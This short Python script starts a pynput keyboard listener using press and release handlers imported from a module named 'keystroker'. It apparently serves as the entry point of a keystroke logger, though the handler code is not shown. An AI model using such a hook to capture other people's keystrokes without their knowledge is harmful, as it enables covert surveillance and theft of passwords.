from keystroker import on_press,on_release
from pynput import *

def main():
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
main()